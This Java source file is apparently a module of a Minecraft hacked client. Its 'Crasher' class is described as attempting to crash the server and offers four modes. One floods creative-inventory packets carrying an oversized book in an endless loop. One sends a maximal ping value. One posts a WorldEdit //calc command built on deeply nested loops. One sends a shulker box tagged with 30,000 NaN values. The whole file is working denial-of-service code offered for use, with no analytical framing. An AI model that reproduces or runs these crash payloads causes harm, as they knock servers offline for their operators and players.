package me.timeswitcher.lupin.mods;

import org.lwjgl.glfw.GLFW;

import me.timeswitcher.lupin.mod.Category;
import me.timeswitcher.lupin.mod.Mod;
import me.timeswitcher.lupin.mod.Mode;
import me.timeswitcher.lupin.utility.GameUtil;
import me.timeswitcher.lupin.utility.PlayerUtil;
import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundNBT;
import net.minecraft.nbt.ListNBT;
import net.minecraft.nbt.StringNBT;
import net.minecraft.network.play.client.CCreativeInventoryActionPacket;
import net.minecraft.network.status.client.CPingPacket;
import me.timeswitcher.lupin.utility.ChatUtil;

public class Crasher extends Mod {

	private final Mode PACKET = new Mode("Book");
	private final Mode PING = new Mode("Ping");
	private final Mode WORLDEDIT = new Mode("WorldEdit");
	private final Mode CREATIVE = new Mode("Creative");

	public Crasher(String name) {
		super(name, Category.WORLD, GLFW.GLFW_KEY_UNKNOWN, "Attempts to crash the server.");
		this.setCurrentMode(PACKET);
		this.getModes().add(PACKET);
		this.getModes().add(PING);
		this.getModes().add(WORLDEDIT);
		this.getModes().add(CREATIVE);
	}

	private void sendBook() {

		new Thread() {
			@Override
			public void run() {
				try {

					final ItemStack item = new ItemStack(Items.WRITABLE_BOOK);
					ListNBT list = new ListNBT();
					final CompoundNBT tag = new CompoundNBT();
					final String author = "Lupin";
					final String title = "crasher";
					final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
					for (int i = 0; i < 50; ++i) {
						final String siteContent = size;
						list.add(StringNBT.valueOf(siteContent));
					}
					tag.putString("author", author);
					tag.putString("title", title);
					tag.put("pages", list);
					item.setTagInfo("pages", list);
					item.setTag(tag);
					while (true) {
						//PlayerUtil.sendPacket(new CPlayerDiggingPacket(Action.START_DESTROY_BLOCK, mc.player.getPosition().down(), Direction.DOWN));
						PlayerUtil.sendPacket(new CCreativeInventoryActionPacket(36, item));
						//PlayerUtil.sendPacket(new CClickWindowPacket(Integer.MAX_VALUE, 36, Integer.MIN_VALUE, ClickType.PICKUP, item, Short.MIN_VALUE));
						Thread.sleep(10L);
					}
				} catch (Exception e) {

				}
			}
		}.start();
	}

	private void sendWorldEditCrash() {
		ChatUtil.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
		ChatUtil.sendClientMessage("WorldEdit crash sent!");
	}

	private void sendCreativeCrash() {
		if (!PlayerUtil.isCreative()) {
			ChatUtil.sendClientMessage("You need to be in creative.");
			return;
		}
		ItemStack item = new ItemStack(Blocks.ORANGE_SHULKER_BOX);
		CompoundNBT base = new CompoundNBT();
		int i = 0;

		while (i < 30000) {
			base.putDouble(String.valueOf(i), Double.NaN);
			++i;
		}
		item.setTag(base);
		i = 0;

		while (i < 40) {
			PlayerUtil.sendPacket(new CCreativeInventoryActionPacket(i, item));
			++i;
		}
		ChatUtil.sendClientMessage("Creative crash sent.");
	}

	@Override
	public void onEnable() {

	}

	@Override
	public void onDisable() {

	}

	@Override
	public void onUpdate() {

		if (!GameUtil.isServerNull()) {

			if (this.getCurrentMode() == PACKET) {

				sendBook();
				toggleMod();

			} else if (this.getCurrentMode() == PING) {
				
				PlayerUtil.sendPacket(new CPingPacket(Long.MAX_VALUE));
				toggleMod();
				
			} else if (this.getCurrentMode() == WORLDEDIT) {

				sendWorldEditCrash();
				toggleMod();

			} else if (this.getCurrentMode() == CREATIVE) {

				sendCreativeCrash();
				toggleMod();
			}
		}
	}
}